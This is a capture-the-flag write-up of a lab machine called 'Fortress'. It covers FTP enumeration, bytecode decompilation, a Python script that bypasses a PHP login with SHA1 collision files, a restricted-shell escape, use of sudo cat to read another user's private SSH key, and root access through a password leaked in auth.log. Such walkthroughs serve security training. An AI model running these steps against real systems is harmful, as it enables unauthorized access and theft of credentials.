# 🏯 Fortress

**Key Learning Points:**
- Anonymous FTP enumeration
- Python bytecode reverse engineering
- SHA1 hash collision exploitation
- Restricted shell breakout techniques
- Linux privilege escalation via log analysis

## Initial Reconnaissance

### Nmap Scan Results

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
5581/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           305 Jul 25  2021 marked.txt
5752/tcp open  unknown
| fingerprint-strings: 
|   Chapter 1: A Call for help
|   Username: Password:
7331/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

### Host Configuration

Add the following entries to `/etc/hosts`:
```
MACHINE_IP   fortress
MACHINE_IP   temple.fortress
```

## Chapter 1: FTP Enumeration and Credential Extraction

### FTP Anonymous Access

Connect to the FTP service and enumerate files:

```bash
ftp 10.201.98.190 5581
Name: anonymous
Password: [Enter]

ftp> ls -al
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 .
drwxr-xr-x    2 ftp      ftp          4096 Jul 25  2021 ..
-rw-r--r--    1 ftp      ftp          1255 Jul 25  2021 .file
-rw-r--r--    1 ftp      ftp           305 Jul 25  2021 marked.txt

ftp> mget *
```

### File Analysis

**marked.txt** contains a cryptic message mentioning:
- Username: `veekay`
- Reference to finding a "backdoor" and retrieving "the key to the map"

**`.file`** is a Python 2.7 compiled bytecode file that requires decompilation.

### Python Bytecode Decompilation

Using tools like `uncompyle2`, the decompiled Python code reveals hardcoded credentials in long byte format:

```python
# Decompiled credentials (converted from long_to_bytes)
username = "1337-h4x0r"
password = "n3v3r_g0nn4_g1v3_y0u_up"
```

### Telnet Authentication

Connect to port 5752 using the extracted credentials:

```bash
telnet 10.201.98.190 5752

Chapter 1: A Call for help
Username: 1337-h4x0r
Password: n3v3r_g0nn4_g1v3_y0u_up
t3mple_0f_y0ur_51n5
```

## Chapter 2: SHA1 Collision Attack

### Web Application Discovery

Navigate to `http://fortress:7331/t3mple_0f_y0ur_51n5.php` to find a login form.

### Source Code Analysis

Viewing the HTML source reveals commented PHP code with the following logic:

```php
<?php
require 'private.php';
$badchar = '000000';
if (isset($_GET['user']) and isset($_GET['pass'])) {
    $test1 = (string)$_GET['user'];
    $test2 = (string)$_GET['pass'];
    $hex1 = bin2hex($test1);
    $hex2 = bin2hex($test2);
    
    if ($test1 == $test2) {
        print 'You can't cross the gates of the temple, GO AWAY!!.';
    }
    else if(strlen($test2) <= 500 and strlen($test1) <= 600){
        print "<pre>Nah, babe that ain't gonna work</pre>";
    }
    else if( strpos( $hex1, $badchar ) or strpos( $hex2, $badchar )){
        print '<pre>I feel pitty for you</pre>';
    }
    else if (sha1($test1) === sha1($test2)) {
        print "<pre>'Private Spot: '$spot</pre>";
    }
    else {
        print '<center>Invalid password.</center>';
    }
}
?>
```

### Attack Requirements

To bypass the checks, we need:
1. `user ≠ pass` (different values)
2. `user > 600 bytes` and `pass > 500 bytes`
3. No NULL bytes in hexadecimal representation
4. `sha1(user) === sha1(pass)` (hash collision)

### SHA1 Collision Implementation

Using collision files from [sha-mbles.github.io](https://sha-mbles.github.io/):

```python
import requests
import hashlib

# Read collision files
with open('messageA', 'rb') as f:
    messageA = f.read()

with open('messageB', 'rb') as f:
    messageB = f.read()

# Verify collision properties
print(f"messageA size: {len(messageA)} bytes")
print(f"messageB size: {len(messageB)} bytes")
print(f"SHA1 match: {hashlib.sha1(messageA).hexdigest() == hashlib.sha1(messageB).hexdigest()}")

# Execute attack
params = {'user': messageA, 'pass': messageB}
response = requests.get("http://fortress:7331/t3mple_0f_y0ur_51n5.php", params=params)
print(response.text)
```

### Result

The successful attack reveals:
```
'The guards are in a fight with each other... Quickly retrieve the key and leave the temple: 'm0td_f0r_j4x0n.txt
```

## Chapter 3: SSH Access and Privilege Escalation

### SSH Key Extraction

Access `http://fortress:7331/m0td_f0r_j4x0n.txt` to retrieve the SSH private key left by `h4rdy` for `j4x0n`.

### Restricted Shell Breakout

Initial SSH connection lands in a restricted bash environment:

```bash
# Save the private key with correct permissions
chmod 600 private_key.pem

# Connect with pseudo-TTY to bypass restrictions
ssh -t -i private_key.pem h4rdy@10.201.81.96 'bash --noprofile'

# Set proper environment variables
export SHELL=/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Horizontal Privilege Escalation

Check sudo privileges for `h4rdy`:

```bash
sudo -l
# Output: User h4rdy may run the following commands on fortress:
#         (j4x0n) NOPASSWD: /bin/cat
```

Extract `j4x0n`'s SSH private key:

```bash
sudo -u j4x0n cat /home/j4x0n/.ssh/id_rsa
```

### Root Privilege Escalation

Login as `j4x0n` and check group membership:

```bash
ssh j4x0n@10.201.81.96 -i id_rsa
id
# Output shows membership in 'adm' group
```

The `adm` group has read access to log files. Analyze `/var/log/auth.log`:

```bash
grep -i password /var/log/auth.log
# Reveals: echo "j4x0n:yoU_c@nt_guess_1t_in_zillion_years" | chpasswd
```

Use the discovered password for root access:

```bash
sudo -l
# Enter password: yoU_c@nt_guess_1t_in_zillion_years
sudo bash
```

## Key Techniques and Tools

### Technical Skills Demonstrated

1. **FTP Enumeration**: Anonymous access and hidden file discovery
2. **Python Reverse Engineering**: Bytecode decompilation and credential extraction
3. **Cryptographic Attack**: SHA1 collision exploitation
4. **Web Application Security**: PHP source code analysis and parameter manipulation
5. **SSH Security**: Key-based authentication and restricted shell bypass
6. **Linux Privilege Escalation**: Log analysis and credential discovery

### Tools Used

- **Nmap**: Network reconnaissance
- **FTP Client**: File enumeration and download
- **uncompyle2**: Python bytecode decompilation
- **Python**: Scripting and cryptographic operations
- **SSH**: Remote access and shell escape techniques
- **grep/log analysis**: System log investigation

## Conclusion

The Fortress room demonstrates a comprehensive attack chain requiring diverse technical skills. The progression from initial enumeration through cryptographic attacks to privilege escalation provides valuable experience in real-world penetration testing scenarios. The SHA1 collision attack serves as a practical demonstration of why deprecated cryptographic algorithms pose security risks in production environments.
